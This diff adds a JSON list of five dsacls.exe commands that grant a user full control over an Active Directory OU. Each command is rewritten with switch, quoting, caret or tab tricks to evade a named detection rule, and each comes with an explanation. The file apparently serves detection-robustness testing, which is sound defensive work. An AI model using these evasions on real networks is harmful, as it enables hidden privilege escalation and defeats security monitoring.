@@ -1,0 +1,22 @@
+[
+  {
+    "output": "dsacls.exe \"OU=Sales,DC=domain,DC=com\" -G \"domain\\user:GA\"",
+    "explanation": "Substitution technique: Built-in Microsoft Active Directory utilities like dsacls.exe natively accept a hyphen ('-') interchangeably with a forward slash ('/') for argument switch prefixes. Substituting ' /G ' with '-G ' completely evades the space-padded selection rule 'CommandLine|contains: \' /G \'' while performing the exact same permission modification behavior."
+  },
+  {
+    "output": "dsacls.exe \"OU=Sales,DC=domain,DC=com\" \"/G\" \"domain\\user:GA\"",
+    "explanation": "Insertion technique: Enclosing the grant switch parameter inside double quotes ('\"/G\"') disrupts the continuous space-padded substring matching logic (' /G ') configured in 'selection_flag'. The native Win32 argument tokenization routines unquote parameters transparently before execution, allowing the program logic to run without modifications."
+  },
+  {
+    "output": "cmd.exe /c dsacls.exe \"OU=Sales,DC=domain,DC=com\" /G^  \"domain\\user:GA\"",
+    "explanation": "Insertion technique: Invoking the command via cmd.exe permits the integration of a caret escape operator ('^') right inside the trailing whitespace segment of the grant flag block. The console interpreter processes and strips the caret out upon instantiation, logging a raw command-line signature containing '/G^ ' to safely neutralize strict space boundary expectations."
+  },
+  {
+    "output": "dsacls.exe \"OU=Sales,DC=domain,DC=com\"\t/G\t\"domain\\user:GA\"",
+    "explanation": "Substitution technique: Replacing the structural literal spaces surrounding the grant parameter switch with horizontal tab characters ('\\t'). The Windows kernel processes horizontal tabs as valid command parameter whitespace separators, which seamlessly subverts tokenized string looks that require explicit space-padded fields."
+  },
+  {
+    "output": "dsacls.exe \"OU=Sales,DC=domain,DC=com\" /G \"domain\\user:G\"\"A\"",
+    "explanation": "Insertion technique: Inserting adjacent empty double quotes within the permissions string identifier token ('G\"\"A'). This breaks continuous character sequence checks for the 'GA' literal monitored in 'selection_permissions', whereas the core application parser unquotes and concatenates the value back into its functional permission mask string at runtime."
+  }
+]
